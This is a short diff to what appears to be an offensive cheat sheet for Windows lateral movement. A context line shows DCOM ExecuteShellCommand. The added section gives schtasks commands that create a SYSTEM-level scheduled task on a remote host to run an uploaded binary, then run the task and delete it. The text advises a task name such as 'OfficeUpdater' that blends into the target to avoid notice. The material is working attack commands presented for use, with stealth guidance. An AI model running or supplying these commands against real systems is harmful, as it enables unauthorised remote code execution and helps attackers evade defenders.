@@ -53,4 +53,17 @@ $i.Document.ActiveView.ExecuteShellCommand(“<FILE_PATH>”,$null,$null,”7”
 
 -- Remote Schtasks Execution --
 
+Upload binary to remote machine, create scheduled task pointing at that binary, run task, and delete task. Can change “OfficeUpdater” to any task name that blends into tar get system
+
+# Add task
+schtasks /Create /F /RU system /SC ONLOGON /TN OfficeUpdater /TR <FILE_PATH> /s <IP_ADDRESS>
+
+# Query task verbose
+schtasks /query /tn OfficeUpdater /fo list /v /s <IP_ADDRESS>
+
+# Run task
+schtasks /run /tn OfficeUpdater /s <IP_ADDRESS>
+
+# Delete task
+schtasks /delete /tn OfficeUpdater /f /s <IP_ADDRESS>
 
